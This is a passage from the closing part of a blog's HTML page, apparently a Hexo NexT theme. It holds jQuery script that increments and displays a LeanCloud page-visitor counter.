    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            
            counter.save(null, {
              success: function(counter) {
                
                  var $element = $(document.getElementById(url));
                  $element.find('.leancloud-visitors-count').text(counter.get('time'));
                
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            
              var newcounter = new Counter();
              /* Set ACL */
              var acl = new AV.ACL();
              acl.setPublicReadAccess(true);
              acl.setPublicWriteAccess(true);
              newcounter.setACL(acl);
              /* End Set ACL */
              newcounter.set("title", title);
              newcounter.set("url", url);
              newcounter.set("time", 1);
              newcounter.save(null, {
                success: function(newcounter) {
                  var $element = $(document.getElementById(url));
                  $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
                },
                error: function(newcounter, error) {
                  console.log('Failed to create');
                }
              });
            
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  
  

  
  

  


  
  

  

  

  

  

  

</body>
</html>
